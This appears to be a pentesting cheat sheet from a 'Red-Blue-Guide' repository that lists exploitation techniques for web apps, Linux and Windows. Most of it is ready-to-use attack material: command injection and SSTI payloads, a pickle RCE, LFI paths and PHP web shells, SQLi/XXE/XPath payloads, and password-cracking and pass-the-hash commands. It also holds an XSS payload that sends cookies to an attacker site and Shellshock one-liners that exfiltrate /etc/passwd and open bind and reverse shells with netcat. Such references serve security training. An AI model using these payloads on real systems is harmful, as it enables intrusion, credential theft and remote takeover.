# TABLE OF CONTENTS
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#general)
2. [LINUX](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#linux)
3. [WINDOWS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#windows)
4. [WEB APPLICATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#webapplication)

<br />

# GENERAL
## TABLE OF CONTENTS (GENERAL)
1. [BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#basics)
2. [AUTHENTICATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#authentication)
3. [COMMAND INJECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#command-injection)
4. [(DE)SERIALIZATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#deserialization)
5. [DIRECTORY TRAVERSAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#directory-traversal)
6. [FILE INCLUSION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#file-inclusion)
7. [LIGHTWEIGHT DIRECTORY ACCESS PROTOCOL (LDAP)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#lightweight-directory-access-protocol-ldap)
8. [OPEN REDIRECT](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#open-redirect)
9. [PASSWORD HACKING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-hacking)
10. [SERVER SIDE REQUEST FORGERY (SSRF)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#server-side-request-forgery)
11. [SERVER SIDE TEMPLATE INJECTION (SSTI)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#server-side-template-injection)
12. [SQLi](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#sqli)
13. [XML](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xml)
14. [XSS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xss)

## BASICS
## Info
### Use RHOST
- `rhost=[IPv4 of your target machine]`: Save time and create one variable for the Remote Host IP address
- `echo $rhost`: show the value of rhost
- `unset rhost`: clear the value of rhost

### Search Exploits
- google --> <service_name> [version] exploit
- shodan --> https://exploits.shodan.io/
- searchsploit (= ExploitDB lookup)
   - `searchsploit apache mod_ssl`
   - `searchsploit -w ftp`: show ftp exploits including web-links
- msf: `search platform:windows port:135 target:XP type:exploit`

<br />

## AUTHENTICATION
## Info
- CSRF Tokens should be changed with every session, not with every request
- Authentication setup via cookie is a **bad idea** (cookie content can be modified by users)
```
# WRONG Practice

<?php
#some code
if (isset($_COOKIE['auth'])){
	$user = $_COOKIE['auth'];
}

#some code
?>
```
- MySQL user name comparison:
   - You create a user and programmatically (i.e.: in Ruby) there is a background check with existing users
   - When the user's details get retrieved, the comparison is done by the database
   - By default, MySQL (type **VARCHAR**) will perform case-insensitive comparison: "admin" = "Admin"
- MySQL trailing
   - MySQL ignores trailing spaces (i.e.: hacker and hacker[space] are equals)
   - This weakness can be leveraged by register admin[space]

<br />

## COMMAND INJECTION
## Info
- Find out what language is used by the application:
   - Look at the response's headers and in different formats (JSON, HTML, Raw etc.)
   - Generate errors
   - Look how special characters are handled by the application (by comparing `+` and `.` for concatenation of strings)
   - You may have to enter special characters **URL-encoded** or **Base64-encoded** (!)
- Know how to comment out in different programming languages (to get rid of the code added by the application)
   - PHP: `//` 
   - SQL: `/* random value */`
   - Concatenation: `"."ha"."ck"."er"."` instead of `hacker`
- The challenge is to break out of the code syntax and keep a clean syntax
- Carefully observe the error or warning calls and modify your command injection accordingly

## HowTo 
- Sequential: `command1 ; malicious_code` (after command1 succeeds, perform malicious_code)
- Pipeline: `command1 | malicious_code` (use output of exploit as input for malicious_code)
- Substitution: `command1 'malicious_code'` (output of malicious_code as arg to exploit)
- Substitution: `command1 $(malicious_code)` (output of malicious_code as arg to exploit)
- Redirection: `command1 > ~/.bashrc` (overwrite bashrc)
- AND: `command1 && malicious_code` --> run command2 if command1 succeeds
- OR: `command1 || malicious_code` --> that will run command2 if command1 fails

```
## PHP ##
#inject command inside quotes
http://example.com/?name=".system('uname -a');"

#adding dummy code
".system('uname -a'); $dummy="

#using comments
".system('uname -a');# or ".system('uname -a');//

#random data + close brackets + your injection + comment out
http://example.com/?order=age);}system('uname -r');//`


## Ruby ##
# Ruby needs backticks ` ` to execute code
# 1)
#Underlying code syntax: eval "\"Hello "+params['username']+"\""
http://example.com/?username=hacker"%2B`uname`%2B"

# 2)
#Download tool for "CVE-2013-0156: Rails Object Injection": https://gist.github.com/postmodern/4499206
#Example: $ rails_rce.rb URL COMMAND --> $ rails_rce.rb http://localhost:3000/secrets/search "puts 'lol'"
#If you customize the command then don't forget backticks
rails_rce.rb http://example.com/ "puts '/usr/bin/cat'" rails3		#pass '/usr/bin/cat' as string
rails_rce.rb http://example.com/ '`/usr/bin/cat`' rails3		#pass '/usr/bin/cat' as command


## Python ##
#Check if python is present with str(True)
http://example.com/hacker"%2bstr(True)%2b"
# 1)
http://example.com/hacker"%2bstr(os.system('id'))%2b"
  ⇒ one cannot store the output of the command into a variable
  ⇒ if command returns “32512” it means “command not found” (exit code in bash would be 127)
  ⇒ if module “os” is not present you use this instead: `__import__('os').system(...)`
  ⇒ http://example.com/hacker"%2Bstr(__import__('os').system(__import__('base64').b64decode('payload')).read())%2B%22
# 2)
http://example.com/hacker"%2bstr(os.popen('id').read())%2b": alternatively .readline() or .readlines()
  ⇒ Store the output of a command (open file object)
  ⇒ One can read from the file object only once
  ⇒ Waits for the completion of a command before providing the full output (compared to os.system)
  ⇒ To check if command worked successfully: 
    • output = os.popen('id')
    • print(output.close()): should return “None” for successful command execution
# 3)
http://example.com/hacker"%2bstr(subprocess.run('id'))%2b"


## Perl ##
http://example.com/hacker'.`uname`.'
http://example.com/hacker'.system(...).'
http://example.com/hacker'.exec(...).'
```
<br />

## (DE)SERIALIZATION
## Info
- Serialisation of objects is used to make storage within applications more efficient/easier
- If an application needs to store an instance of a class, it can use serialization to get a string representation of this object
- When the application needs to use the instance again, it will simply unserialise the string
- An attacker who can tamper the string could potentially trigger unexpected behaviour or remote code execution in the application
- You need to pickle the object on the same platform:
	- If the vulnerable system is Linux system, you need to pickle on Linux machine
	- A pickled object for Windows has to be created on Windows platform
	- Potential bypass: use `subprocess` with `__import__`
- If you send malicious pickled objects to a Web App, it probably responds with 500 error due to unknown object. However, the code likely gets executed before the error message appears

## HowTo
- A starting example is the module Pickle in python
- `dumps()`: This function is called to serialize an object hierarchy
- `loads()`: This function is called to de-serialize a data stream
```
#python2
import os
import cPickle

class foo(object):
  def __reduce__(self):
   return (os.system,("cat /etc/passwd",))

f = foo()
print cPickle.dumps(f)

## OUTPUT of python2 example.py
cposix
system
p1
(S'cat /etc/passwd'
p2
tp3
Rp4
.


#python3
import os
import pickle

class foo(object):
  def __reduce__(self):
   return (os.system,("cat /etc/passwd",))

f = foo()
dump = pickle.dumps(f)
print(dump)
#print(dump.decode('unicode-escape')   <-- if output shall be string type

## OUTPUT of python3 example.py
b'\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04blah\x94\x93\x94)\x81\x94.'

```

<br />

## DIRECTORY TRAVERSAL
## Info
- Windows: You will be able to access `test/../../../file.txt`, even if the directory test does not exist
- Linux: Not possible 
- This might be useful when you can inject user-controlled data to create a file name
- Example: $file = "/var/www/example_".$_GET['id'].".txt";

## HowTo
- `http:example.com/../../../../../../../etc/passwd`: most common use case
- `http:example.com/var/www/../../../../../etc/passwd`: if the begining of the path is fixed
- `http:example.com/../../../../../../../etc/passwd%00`: to bypass server-side code added at the end (applicable to old Perl and PHP versions)


<br />

## FILE INCLUSION
## Info
### Remote
- **Attacker uploads file from external source**
- These PHP functions are vulnerable:
    - **allow_url_include**
    - **allow_url_fopen**
    - **include() / include_once()**
    - **require() / require_once()**
- Examples:
    - Inject remote file from own server: https://example.com/login.php?user=http://malware.bad/malicious.php
    - Inject malicious script: https://example.com/login.php?user=malicious.php
- Get rid off server-side code endings:
    - Add `&blah=` or `?blah=` depending on your URL

### Local 
- **Attacker retrieves a file that already exists on hosting server**
- Null Byte Attack
   - https://example.com/login.php?user=../../Windows/system32/cmd.exe%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htaccess%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htpasswd%00
   - %00 terminates string to avoid adherence of specific extension (e.g. .php)
- Base64
   - ?user=php://filter/read=convert.base64-encode/resource=/etc/passwd
   - Decode the server response separately to get target output
- Fuzzing via Burpsuite Intruder (Directory Traversal)
- LFI Suite:
   - [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)

### Best Practice
- Input Validation (Whitelisting allowed file extensions)
- Exclude the directory separators “/” 
- Patch php version regularly


## HowTo
### Code to check while enumerating RFI
- `<?php phpinfo() ?>`
- `<?php system("whoami"); ?>`
- ```<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>```
- ```<?php $c=$_GET[‘c’]; echo `$c`; ?>```
- `<?php passthru($_GET['cmd']); ?>`
- `<?php echo shell_exec("whoami");?>` For shell_exec to output the result you need to echo it

#### Files to check while enumerating LFI
- `../../../../../../../etc/passwd`
- `../../../../../../../home/<users>/.ssh/authorized_keys`
- `../../../../../../../home/<users>/.ssh/bash_history`
- To get the username of who we’re running as: `../../../../../../../proc/self/environ`
- To see what binary is running this service: `../../../../../../../proc/self/cmdline`
- index.php / config.php / settings.php / php.ini

<br />

## LIGHTWEIGHT DIRECTORY ACCESS PROTOCOL (LDAP)
## Info
### LDAP Syntax
- Boolean OR: `(|(cn=[INPUT1])(cn=[INPUT2]))` --> to get records matching [INPUT1] or [INPUT2]
- Boolean AND: `(&(cn=[INPUT1])(userPassword=[INPUT2]))` --> to get records matching cn=[INPUT1] and password=[INPUT2]
- LDAP can parse wildcards `*` 
- Remove server-side code with Nullbyte `%00`
- LDAP Password Formats:
   -  `{CLEARTEXT}`, `{MD5}`, `{SMD5}` (salted MD5), `{SHA}`, `{SSHA}` (salted SHA1), `{CRYPT}`

### Null Bind
- If you are lucky, the target system runs LDAP with authorised NULL Bind
- If null values are sent, the LDAP server will proceed to bind the connection
- The credentials may get verified as correct
- You need to completely remove `username=&password=` from your query to send null values
	
## HowTo
- `example.com/?name=admin&password=admin`: normal URL
- `example.com/?name=Badguy)(cn=*))%00&password=admin`: Modified URL with LDAP injection to authenticate as Badguy
- `example.com/?name=b*)(cn=*))%00&password=admin`: To login as any user available starting with “b”

<br />

## OPEN REDIRECT
## Info
- Open Redirects are normally low impact vulnerabilities (unless you can steal Oauth tokens)
- Example:
	- Start Page: http://example.com/login.php
	- Redirect happens when the following is entered: http://example.com/
	- Output: Code 3xx
	- `curl http://example.com/`: curl (by default) does not follow redirects
- Use webhooks to check if your redirect works:
   - [https://webhook.site](https://webhook.site)
   - [https://bin.webhookrelay.com](https://bin.webhookrelay.com/)
- Note that below URLs are identical:
   - `http://example.com/redirect.php?uri=https://webhook.site/xyz`
   - `http://example.com/redirect.php?uri=//webhook.site/xyz`

```
#Implementation of function "die()" to stop executing code after redirect

<?php
  if (!isset($_SESSION['username'])) {
	header("Location: /login.php");
	}
	require "header.php";
	die(); 			# this would stop the code after redirect to /login.php
?>
```

<br />

## PASSWORD HACKING
## Info
### Rainbow Tables
- Good for LM, NTLM and MD5 Hashes without Salt or Pepper
- Less CPU power, but more storage needed (!) 
   - NTLM hash with [uppercase, lowercase, numbers] and max length of 9 chars = 690GB of space (!)

### Lookups
- Query a database with hashes and passwords
- Easiest way to crack hashes
- Difference between Lookups and Rainbow Tables:
    - Data not stored on your system (no huge disk required)
    - DB contains well known wordlist and breach data (i/o every single combination)

## HowTo
### Pass the Hash (Hash Injection Attack)
- Use dumped hashes for Authen (password not required!)
- `pth-winexe -U [targetUser] //[IPv4] [command]`
- Best Case: User-Account-Control off, Windows Firewall off
- Helpful with LM, NTLM-Authen and SSO-mechanisms

### Wordlists
1. Kali: /usr/share/wordlists (pre-installed)
2. CLI tool **crunch**
   - `crunch 4 6 abcdefg123! -o crunchlist1.txt`
   - 4 6 = word length between 4 and 6
   - abcdefg123! = use chars out of this list
3. CLI tool **cewl**
   - custom wordlist generator based on website content
   - `cewl https://cisco.com -m 6 -d 3 -w cisco.cewl`
   - -m = minimum word length
   - -d = depth of sub directories
   - -w = write
4. [https://github.com/p-arrow/SecLists/tree/master/Passwords](https://github.com/p-arrow/SecLists/tree/master/Passwords)

### John the Ripper
- Detailed examples: [https://www.openwall.com/john/doc/EXAMPLES.shtml](https://www.openwall.com/john/doc/EXAMPLES.shtml)
- Install Jumbo Patch: [Github/openwall](https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL)
- copy full user line into file and save as mypass: `victim:R7xTxLfuQeacY:19003:0:99999:7:::`
- `john mypass`: use discovered password hash from "mypass" and supply it to john 
- `john mypass --format=NAME`: Specify the hash format (descrypt/bsdicrypt/md5crypt/bcrypt/LM/AFS/tripcode/dummy/crypt)
- `john --list=formats`: show available hash formats recognized by john (**after installation of john jumbo patch**
- `john --show mypass`: show results after cracking of mypass
- `john --wordlist=cisco.cewl --rules mypass`: enable wordlist for password cracking
- `john --restore`: continue interrupted session
- `nano /etc/john/john.conf`: configuration of wordlist-rules
- results are saved under .john/john.pot (No second run with same wordlist necessary) 
- On Linux: `unshadow /etc/passwd /etc/shadow > mypasswd` ; `john mypasswd`
- For zip files use `zip2john file.zip > zip.hashes` (this generates hashes which you can crack by using `john zip.hashes`)
- For rar files use `rar2john file.rar > rar.hashes` (this generates hashes which you can crack by using `john rar.hashes`)

### Hydra
Check out: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)*

```
hydra -h ; hydra http-form-post -U (service module help)
hydra -l admin -P pw.txt "http-form-post://IPv4:80/login:username=^USER^&password=^PASS^:fail"
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

### Hashcat
Check out: [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)

1. msf: `use post/windows/gather/hash` ("run" requires admin privilege)
2. Check for NT-Hash: `<Uname>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:`
3. `hashcat -m 1000 -a 0 hash.txt /usr/share/john/password.lst`
    - `-m 1000` = hash-type NTLM
       - Other Types:
       - 900 = MD4
       - 0 = MD5
       - 100 = SHA1 
       - 3000 = LM
    - `-a 0` = attack-mode Straight
       - Other types: 
       - 1 = Combination
       - 3 = Brute-force
4. `hashcat --show hash.txt` Show cracked hashes

### pwdump/FGDump
- Dump LM/NTLM-Hash via pwdump/FGDump:
    - pwdump-structure: `<Uname>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:`
- LM Hash for "no password": 
    - "aad3b435b51404ee" "aad3b435b51404ee"

<br />

## SERVER SIDE REQUEST FORGERY
## Info
- Based on HTTP Requests
- Basically you get the server to make HTTP requests on your behalf
- `http://example.com/?url=http://localhost:1234/`: request access to localhost (= server) on port 1234

<br />

## SERVER SIDE TEMPLATE INJECTION 
## Info
- This attack pattern requires for instance Flask/Jinja development stack (Python)
- Readings: https://hackerone.com/reports/125980
- or [Twig](https://twig.symfony.com/), a PHP template engine

## HowTo
```
#Simple calculation
{{'7'*7}}   																			

#Retrieve available classes and modules
{{''.__class__.mro()[1].__subclasses__()}}    						

#Execute command
{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}		
```
- Check out popen for usage as subclass called: https://docs.python.org/3/library/subprocess.html?highlight=popen#subprocess.Popen
- Use below payload when Twig is deployed on the target system:
   - `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`

<br />

## SQLi
## Info
- Full Cheat Sheet: [www.netsparker.com/blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [Coding/SQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/SQL.md)
- [W3School SQL](https://www.w3schools.com/sql/)

### SQL Types
1. MySQL
2. SQL Server
3. PostgreSQL
4. Oracle
5. MongoDB (NoSQL)

## HowTo
### SQL Injection: Quick and Dirty
```
#Try both ' (single quote) and " (double quote)
#Continue with the quote that breaks the implemented SQL syntax

admin' --
admin' #
admin'/*
admin'/**/OR/**/1=1/**/#
admin'%09OR%091=1%09# (when intercepting query with proxy, you can use "%09" as "space")
test' OR 1=1 LIMIT 1; #
' or 1='1
' or 1=1 --
' or 1=1 #
' or 1=1 /*
') or ‘1’ =’1--
') or (‘1’=’1--
' || 1=’1
```

### MongoDB (NoSQL)
```
|| 1==1 %00
|| 1==1 //
|| 1==1 <!--
'|| 1==1 <!--
/?username=admin'|| 1==1 %00

#There are case where the password field does not exist for some records (since it's a NoSQL database)
#Then you can implement regex-command "this.password" or "this.password.match()" in your payload
1) /?search=admin'%20%26%26%20this.password.match(/^./)%00 
2) /?search=admin'%20%26%26%20this.password%20%26%26%20this.password.match(/^./)%00 
```
### MySQL addslashes
- [http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string](http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string)
- This exploit relies on the usage of GBK
- It's possible to generate a single quote and break out of the SQL syntax to inject a payload
- Use the string \xBF' → %bf%27 or 1=1 -- 
- in Burp: `username=%bf%27+OR+1=1+#&password=test`

### SQL Comments
```
#Use Comments to finish your payload. Hence you don't rely on the original code that follows your payload

1) --
2) /*  */
3) #
```

### Combine Queries 
```
#Link queries with ";"
SELECT * FROM xyz ; SELECT * FROM abc`

#Link queries with UNION injections
#You can poison query to return records from different tables
#The number of columns from both SELECT statements >>must be<< identical !
SELECT username, admin FROM members UNION SELECT password, admin FROM members
/test.php?id=3 OR '1'='1' UNION SELECT id, login, user, password FROM users
/test.php?id=3 OR '1'='1' UNION SELECT id, login, version(), password FROM users
/test.php?id=3 OR '1'='1' UNION SELECT database(), login, current_user(), password FROM users
/test.php?id=3 OR '1'='1' UNION SELECT 1, concat(table_name, “:”, column_name), 3, 4 FROM information_schema.columns
/test.php?id=3 OR '1'='1' UNION SELECT 1, concat(login, “:”, password), 3, 4 FROM users
```

### Tools
#### mssqlclient.py
- `python3 mssqlclient.py USER@10.10.10.27 -windows-auth`
- `SELECT IS_SRVROLEMEMBER('sysadmin')`
   - Output "1" = yes

#### sqlmap
```
--> HTTP POST request: (after interception) save request to file (Burpsuite)
--> sqlmap -r request -p password (-p = analyze Parameter from POST method)
--> sqlmap -r request -D [database] --tables
--> sqlmap -r request -D [database] -T [table] --dump
--> -p "Parameter" -u "url" --tables
--> -p "Parameter" -D [DBMS] -T [Table] --dump -u "url"
```

<br />

## XML
## Info
### Missing Encryption/Input Validation
- XML data vulnerable to spoofing /request forgery / code injection

### XML Bomb
- Entities that expand to exponential size, consuming memory (DoS!)

### XML External Entity (XXE)
- Embeds a request for a local resource (LFI with XML)

### XPath
- Imagine the XML document as a database, and XPath as an SQL query
- Like with SQLi you can manipulate the query and get unauthorized access to the system 
- Syntax: `[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]`


## HowTo
### XXE
```
#Option1
<!DOCTYPE test [
    <!ELEMENT test ANY>
    <!ENTITY x SYSTEM "file:///etc/passwd">]>
<test>&x;</test>     

#Option2
<!DOCTYPE test [
    <!ENTITY x SYSTEM "file:///etc/passwd">]>
<test>&x;</test>


#Don't forget to encode "&" with "%26" when sending this payload as URL
```

### XPath
```
#XPath Injection
' or '1'='1 and you should get all results.

#Get up in hierarchy by using parent::* --> Remember: [PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
#Use NULL BYTE to end the string
username']/parent::*/child::node()%00    #go up to parent directory, then access childs and display all nodes
username' or 1=1]/parent::*/child::node()%00    #display all nodes related to "username" with respective value
admin' or 1=1]/parent::*/child::node()%00    #display all nodes related to "admin" with respective value
```

<br />

## XSS
## Info
1. **Reflected XSS**
- non-persistent effect activated by a victim clicking a link
- Example: `https://example.com/search?q=<script%20type='application/js'>alert('xss')</script>`
2. **Stored/Persistent XSS**
- Attempts to store data persistently on the web server
3. **DOM-based XSS**
- Attempt to exploit the victim's web browser
- The page could actually be completely static and still be vulnerable
- Example: `https://example.com/index.html#default=<script>alert(document.cookie)</script>`
- On vulnerable source code side: `<script>document.write(decodeURIComponent(location.hash.substring(1)));</script>`
     
## HowTo
### Common Patterns
- [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
```
<script>alert("XSS LEAK")</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(2)>
"; alert(1) ; //

#General Approach (Best Practice!)
# 1) Insert below "benign" payload
1234 '" ><

# 2) Take a look after injecting your code and analyze how the application interpreted it
# 3) Search your payload via crtl+F inside the pages source code
# 4) Then modify the payload to get your code executed
```
### PHP_SELF
```
#Sometimes developers use and trust PHP_SELF (= path provided by the user)
#Often found on pages with forms or error pages (404 and 500)

#ORIGINAL
<form action="/index.php" method="POST">
Your name:<input type="text" name="name" />
<input type="submit" name="submit"/>
</form> 

#MODIFIED
<form action="/index.php/test"><script>alert('xss')</script><" method="POST">
Your name:<input type="text" name="name" />
<input type="submit" name="submit"/>
</form> 
```
### Steal Cookies (from example.com)
```
#Encoded (necessary for successful exploit)
http://example.com/index.php?name=test%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://yourOwnMalicious.site?c=%27%2Bdocument.cookie%2B%27%22%20/%3E%27);%3C/script%3E

#NotEncoded
http://example.com/index.php?name=test<script>document.write('<img src="http://yourOwnMalicious.site?c='+document.cookie+'" />');</script>
```

<br />

# LINUX
## TABLE OF CONTENTS (LINUX)
1. [PASSWORD RECOVERY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-recovery-linux)

## PASSWORD RECOVERY (LINUX)
## HowTo
1. Boot up, press "e" when grub loader window appears 
2. Change last Linux-row from  `ro single` to `rw init=/bin/bash` (ro = read only; rw = read write)
3. Then press Strg+X or F10
4. Start at Recovery Mode
5. Change PW of root + user via `passwd`, then reboot

<br />

# WINDOWS
## TABLE OF CONTENTS (WINDOWS)
1. [PASSWORD RECOVERY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-recovery-windows)
2. [PSEXEC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#psexec)
3. [WEBDAV](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#webdav)


<br />

## PASSWORD RECOVERY (WINDOWS)
## HowTo
1. Boot Windows from CD/USB --> select System repair --> CMD  Eingabeaufforderung
2. Select volume with Windows installed
   - `diskpart` > `list disk` > `sel disk [x]`
4. On Windows volume: `cd c:\Windows\System32`
5. Create backup of original utilman.exe: `move utilman.exe utilman.exe.bak`
6. Replace utilman with cmd: `copy cmd.exe utilman.exe`, exit
   - Alternative: `copy cmd.exe sethc.exe`, exit  (sethc.exe = Sticky-Key = Activation via 5x pressing "arrow key up")
   - Now, sethc/utilman with system privileges is available before login 
7. Start from HDD/SSD > select "Easier usage" at login window
8. CMD is opened and you can enter: `net user [Name] *`
9. Press 2 times Enter to create empty PW

<br />

## PSEXEC
## HowTo
### Start Registry with System-Privileges
- CMD (admin): psexec –i –d –s regedit.exe

### Remote Commands
- `psexec \\[IPv4] cmd`: to start CMD remotely
- `psexec \\[IPv4] -c "Z:\files\ccleaner.exe” cmd /S`: copy ccleaner -silent install

## WEBDAV
## Info
### Web-based Distributed Authoring and Versioning
- Component of **Microsoft Internet Information Server (IIS)**
- Used for editing and file management
- Interacts with core operating system components (!)
- WebDAV expose the system to possible Vulnerabilities
   - Buffer Overflow
   - DoS
   - Domain Based Scripting Attacks
   - PoE
   - RCE
- Administrators manage/edit Web Content via commands
   - `PROPFIND`, `COPY`, `MOVE`, `PROPPATCH`, `MKCOL`, `LOCK`, `UNLOCK`

<br />

# WEBAPPLICATION
## TABLE OF CONTENTS (WEBAPPLICATION)
1. [PENTEST CHECKLIST](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#pentest-checklist)
2. [LESSONS LEARNED](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#lessons-learned)

<br />

## PENTEST CHECKLIST 
## Info
 - [Wiki/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Wiki/Web%20Application.md)
 - [Reconnaissance/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/1_Reconnaissance.md#web-application)


Vulnerability | Test Method
------------- | -----------
Insufficient Cache Controls | Observe headers on pages containing sensitive data
Username Enumeration | Login valid user/invalid password – then compare. Login invalid user/invalid password – then compare
Session Cookies Not Marked Secure | Observe response headers after authentication
Implementation of CSRF #1 | Systematically check and evaluate CSRF tokens in all requests
Implementation of CSRF #2 | Transport of CSRF-Token via POST or GET method
Server Version | If observed server version appears old, then check if this server is backported (= security fixes from new software incl.)
Secure HTTP Headers | Check Top5 secure attributes

<br />

## LEASSONS LEARNED
## HowTo
1. [DOM BASED URL REDIRECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#1-dom-based-url-redirection)
2. [WEB SERVER TRACE ENABLED](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#2-web-server-with-tracetrack-enabled-xst)
3. [CGI](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#3-cgi-common-gateway-interface)
4. [JSON WEB TOKEN](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#4-json-web-token)
5. [SECURE HTTP HEADERS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#5-secure-http-headers)

### 1) DOM Based URL Redirection
- Look for `https://example.com/#dashboard`
- The value after `#` is accessible by Javascript
- Use `window.location.hash`
- If URL Redirection is in place you can test if a redirection to an external site is possible
- Enter `https://example.com/#www.externalsite.com`
- Activate the redirection via Javascript
- `window.location = window.location.hash.substr(1)`: use substr() to remove the '#'
- Following mitigations exist:
   - A) URL Whitelisting: `https://example.com/redirect?externalPage=1` or `https://example.com/redirect?page=dashboard`
   - B) REGEX

### 2) Web Server with TRACE/TRACK enabled (XST)
- Details: [https://owasp.org/Cross_Site_Tracing](https://owasp.org/www-community/attacks/Cross_Site_Tracing)
- "XST could be used as a method to steal user’s cookies via XSS"
- "This is possible even if the cookie has the “HttpOnly” flag set or exposes the user’s Authorization header"
- `curl -X TRACE www.example.org`
- `curl -X TRACE -H "Cookie: name=value" www.example.org`

### 3) CGI (Common Gateway Interface)
- CGIs commonly use Python or Perl, but in few cases also Shell or even C
- When you call a CGI, the web server will start a new process and run the CGI
- The web server uses environment variables (inside HTTP Header) to pass information to CGI 
- A HTTP header named XYZ in your request will lead to an environment variable named HTTP_XYZ in CGI 
- Shellshock Exploitation:
```
#Netcat: Exfiltration of /etc/passwd
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: victim.com\r\nConnection: close\r\n\r\n" | nc victim.com 80

#Bind Shell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -lp 9999 -e /bin/sh\r\nHost: victim.com\r\nConnection: close\r\n\r\n" | nc victim.com 80

#Reverse Shell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc yourServer 443 -e /bin/sh\r\nHost: victim.com\r\nConnection: close\r\n\r\n" | nc victim.com 80
#On your machine
nc -lp 443
```
### 4) JSON Web Token
#### Attack Pattern
1. Register a User
2. Retrieve the cookie
3. Decode the cookie
4. Tamper the cookie
5. Re-encode the cookie
	- If you change “algorithm” to “None”, then remove the signature part but leave the last “.”
   	- Example Original: `eyJhbGciOiJkkkkkklIkpXUyJ9.eyJsb2dpbiI6InBhdG8ikkzY2MDUxIn0.MTU5MDE2...OThiMTliNg`
   	- Example Modified: `eyJhbGciOiJlllllklIkpXUyJ9.eyJsb2iuiuziuziuii8ikkzY2MDUxIn0.`
7. Send the new cookie

#### Syntax
- JWT = `Base64(header) + "." + Base64(payload) + "." + Base64(signature)`
- signature = `HMACSHA256(Base64(header) + "." + Base64(payload), SECRET_KEY)`

#### Best Practice (Blue Team)
- Use a secure connection during token transfer
- Never transfer user’s sensitive data in tokens, limiting oneself to impersonal identifiers
- Limit the JWT lifetime and use refresh tokens
- Keep one or several authorised algorithms on the application side (dismiss all tokens with different signature algorithm)
- Work with one algorithm only, e.g. HS256 or RS256 (Available: RSA based, Elliptic curves, HMAC, **None**)

### 5) Secure HTTP Headers
1. Strict Transport Security (enforce HTTPS)
2. XSS Protection (standard in modern browsers)
3. X-Frame-Options (against clickjacking)
4. Content Type Options (use “nosniff” to prevent drive-by-downloads due to maliciously declared content-types)
	- Downloads could be treated as executable or dynamic HTML file

#### Best Practice
- Strict-Transport-Security: max-age=16070400; includeSubDomains
- X-XSS-Protection: 1; mode=block
